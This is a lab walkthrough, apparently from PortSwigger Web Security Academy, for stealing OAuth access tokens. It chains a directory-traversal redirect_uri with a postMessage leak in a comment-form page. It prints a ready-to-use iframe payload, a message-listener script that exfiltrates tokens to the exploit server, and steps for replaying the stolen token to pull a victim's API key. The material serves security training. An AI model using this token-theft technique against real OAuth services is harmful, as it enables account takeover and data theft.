## Stealing OAuth access tokens via a proxy page

**Category:** oauth
**Difficulty:** Unknown

### Description
This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application.

### Solution Steps
1. Study the OAuth flow while proxying traffic through Burp. Using the same method as in the previous lab , identify that the redirect_uri is vulnerable to directory traversal. This enables you to redirect access tokens to arbitrary pages on the blog website.
2. Using Burp, audit the other pages on the blog website. Observe that the comment form is included as an iframe on each blog post. Look closer at the /post/comment/comment-form page in Burp and notice that it uses the postMessage() method to send the window.location.href property to its parent window. Crucially, it allows messages to be posted to any origin ( * ).
3. From the proxy history, right-click on the GET /auth?client_id=[...] request and select "Copy URL". Go to the exploit server and create an iframe in which the src attribute is the URL you just copied. Use directory traversal to change the redirect_uri so that it points to the comment form. The result should look something like this: <iframe src="https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT_ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=-1552239120&scope=openid%20profile%20email"></iframe>
4. Below this, add a suitable script that will listen for web messages and output the contents somewhere. For example, you can use the following script to reveal the web message in the exploit server's access log: <script>
    window.addEventListener('message', function(e) {
        fetch("/" + encodeURIComponent(e.data.data))
    }, false)
</script>
5. To check the exploit is working, store it and then click "View exploit". Make sure that the iframe loads then go to the exploit server's access log. There should be a request for which the path is the full URL of the comment form, along with a fragment containing the access token.
6. Go back to the exploit server and deliver this exploit to the victim. Copy their access token from the log. Make sure you don't accidentally include any of the surrounding URL-encoded characters.
7. Send the GET /me request to Burp Repeater. In Repeater, replace the token in the Authorization: Bearer header with the one you just copied and send the request. Observe that you have successfully made an API call to fetch the victim's data, including their API key.
8. Use the "Submit solution" button at the top of the lab page to submit the stolen key and solve the lab.

### Key Payloads
- `wiener:peter`
- `redirect_uri`
- `iframe`
- `/post/comment/comment-form`
- `postMessage()`
- `window.location.href`
- `GET /auth?client_id=[...]`
- `<iframe src="https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT_ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=-1552239120&scope=openid%20profile%20email"></iframe>`
- `<script>
    window.addEventListener('message', function(e) {
        fetch("/" + encodeURIComponent(e.data.data))
    }, false)
</script>`
- `GET /me`

### Indicators of Success
- Check for changes in application behavior
- Look for error messages or data exposure
- Verify the vulnerability type: oauth

---
*Source: PortSwigger Web Security Academy*
